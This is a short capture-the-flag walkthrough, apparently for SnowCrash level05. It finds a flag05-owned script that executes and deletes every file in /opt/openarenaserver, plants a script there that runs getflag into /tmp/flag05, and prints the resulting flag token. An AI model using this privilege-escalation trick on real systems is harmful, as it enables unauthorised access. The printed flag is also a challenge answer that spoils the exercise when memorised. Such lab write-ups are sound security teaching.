level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile

level05@SnowCrash:~$ find / -user flag05 -group flag05 -ls 2>/dev/null | grep -v proc
 11521    4 -rwxr-x---   1 flag05   flag05         94 Mar  5  2016 /usr/sbin/openarenaserver
 37846    1 -rwxr-x---   1 flag05   flag05         94 Mar  5  2016 /rofs/usr/sbin/openarenaserver

permission says it is executable


level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

It executes all files inside /opt/openarenaserver/ and then deletes them
one by one

so we can create a script that gets the flag and saves it in a specific flag

echo "getflag > /tmp/flag05" > /opt/openarenaserver/script.sh

cat /tmp/flag05

viuaaale9huek52boumoomioc